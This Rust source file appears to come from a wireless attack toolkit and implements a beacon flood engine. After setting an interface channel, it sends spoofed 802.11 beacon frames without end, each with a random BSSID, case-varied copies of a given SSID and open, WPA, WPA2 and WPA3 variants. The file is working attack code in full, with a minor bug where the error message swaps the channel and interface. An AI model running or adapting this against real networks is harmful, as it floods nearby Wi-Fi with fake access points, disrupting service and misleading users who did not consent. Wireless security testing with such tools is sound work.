use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::BcFloodArgs;
use crate::addrs::Bssid;
use crate::iface::{Iface, IfaceManager};
use crate::builders::Frames;
use crate::sockets::Layer2Socket;
use crate::generators::RandomValues;
use crate::utils::{ CtrlCHandler, inline_display, abort};



pub struct BeaconFlood {
    iface   : Iface,
    channel : i32,
    ssid    : String,
    bc_sent : usize,
    builder : Frames,
    socket  : Layer2Socket,
}


impl BeaconFlood {

    pub fn new(args: BcFloodArgs) -> Self {
        Self { 
            bc_sent : 0,
            builder : Frames::new(),
            socket  : Layer2Socket::new(&args.iface),
            iface   : args.iface,
            channel : args.channel,
            ssid    : args.ssid,
        }
    }



    pub fn execute(&mut self) {
        self.set_channel();
        self.send_endlessly();
    }



    fn set_channel(&self) {
        if !IfaceManager::set_channel(self.iface.name(), self.channel) {
            abort(
                format!(
                    "Uneable to set channel {} on interface {}", 
                    self.iface.name(),
                    self.channel
                )
            )
        }
    }



    fn send_endlessly(&mut self) {
        let mut rand = RandomValues::new(None, None); 
        let running  = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());


        while running.load(Ordering::SeqCst) {
            let bssid = rand.random_bssid();
            let ssid  = rand.random_case_inversion(&self.ssid);
            let seq   = rand.random_seq();
            
            self.send_quartet(bssid, &ssid, seq);
        }
        
        println!("\nFlood interrupted"); 
    }



    fn send_quartet(
        &mut self,
        bssid : Bssid,
        ssid  : &str,
        seq   : u16
    ) {
        self.send_beacon(bssid, ssid, seq,     "open");
        self.send_beacon(bssid, ssid, seq + 1, "wpa");
        self.send_beacon(bssid, ssid, seq + 2, "wpa2");
        self.send_beacon(bssid, ssid, seq + 3, "wpa3");
    }



    #[inline]
    fn send_beacon(
        &mut self, 
        bssid : Bssid, 
        ssid  : &str,
        seq   : u16,
        sec   : &str
    ) {
        let beacon = self.builder.beacon(bssid, ssid, seq, self.channel as u8, sec);
        
        self.socket.send(beacon);
        self.bc_sent += 1;

        inline_display(&format!("Beacons sent: {} - SSID: {}", &self.bc_sent, ssid));
    }

}




impl crate::EngineTrait for BeaconFlood {
    type Args = BcFloodArgs;
    
    fn new(args: Self::Args) -> Self {
        BeaconFlood::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}